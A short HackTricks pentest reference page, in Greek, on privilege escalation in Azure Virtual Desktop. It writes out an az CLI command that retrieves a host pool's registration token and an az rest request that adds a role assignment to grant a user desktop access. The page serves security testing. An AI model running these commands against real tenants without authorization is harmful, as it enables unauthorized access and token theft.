# Az - Virtual Desktop Privesx

{{#include ../../../banners/hacktricks-training.md}}

## Azure Virtual Desktop Privesc

Για περισσότερες πληροφορίες σχετικά με το Azure Virtual Desktop, ελέγξτε:

{{#ref}}
../az-services/az-virtual-desktop.md
{{#endref}}


### `Microsoft.DesktopVirtualization/hostPools/retrieveRegistrationToken/action`
Μπορείτε να ανακτήσετε το token εγγραφής που χρησιμοποιείται για την εγγραφή εικονικών μηχανών εντός ενός host pool.
```bash
az desktopvirtualization hostpool retrieve-registration-token -n testhostpool -g Resource_Group_1
```
### Microsoft.Authorization/roleAssignments/read, Microsoft.Authorization/roleAssignments/write

> [!WARNING]
> Ένας επιτιθέμενος με αυτές τις άδειες θα μπορούσε να κάνει πράγματα πολύ πιο επικίνδυνα από αυτό.

Με αυτές τις άδειες μπορείτε να προσθέσετε μια ανάθεση χρήστη στην ομάδα Εφαρμογών, η οποία είναι απαραίτητη για την πρόσβαση στη εικονική μηχανή του εικονικού επιτραπέζιου υπολογιστή:
```bash
az rest --method PUT \
--uri "https://management.azure.com/subscriptions/<SUBSCRIPTION_ID>/resourceGroups/<RESOURCE_GROUP_NAME>/providers/Microsoft.DesktopVirtualization/applicationGroups/<APP_GROUP_NAME>/providers/Microsoft.Authorization/roleAssignments/<NEW_ROLE_ASSIGNMENT_GUID>?api-version=2022-04-01" \
--body '{
"properties": {
"roleDefinitionId": "/subscriptions/<SUBSCRIPTION_ID>/providers/Microsoft.Authorization/roleDefinitions/1d18fff3-a72a-46b5-b4a9-0b38a3cd7e63",
"principalId": "<USER_OBJECT_ID>"
}
}'
```
Σημειώστε ότι για να μπορέσει ένας χρήστης να έχει πρόσβαση σε μια Επιφάνεια Εργασίας ή μια εφαρμογή, χρειάζεται επίσης τον ρόλο `Virtual Machine User Login` ή `Virtual Machine Administrator Login` πάνω από το VM.

{{#include ../../../banners/hacktricks-training.md}}
